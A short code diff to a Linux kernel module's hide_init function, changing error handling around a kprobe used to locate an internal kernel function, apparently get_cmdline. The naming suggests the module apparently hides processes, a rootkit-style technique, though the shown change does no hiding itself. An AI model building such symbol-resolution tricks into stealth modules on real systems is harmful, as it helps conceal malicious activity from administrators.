@@ -348,10 +348,13 @@ static int __init hide_init(void)
 
 	if (register_kprobe(&kpc) < 0) {
 	    printk("kpm: cmdline bsdk not kprobed");
-        return;
-    }
-    my_get_cmdline = (int (*)(struct task_struct *task, char *buffer, int buflen)) kpc.addr;
-    unregister_kprobe(&kpc);
+        // return;
+    } else {
+        my_get_cmdline = (int (*)(struct task_struct *task, char *buffer, int buflen)) kpc.addr;
+		pr_info("pvm: cmdline bsdk wala found");
+		unregister_kprobe(&kpc);
+	}
+    
     // printk("driverX: this: %p", THIS_MODULE); /* TODO: remove this line */
     return 0;
 }
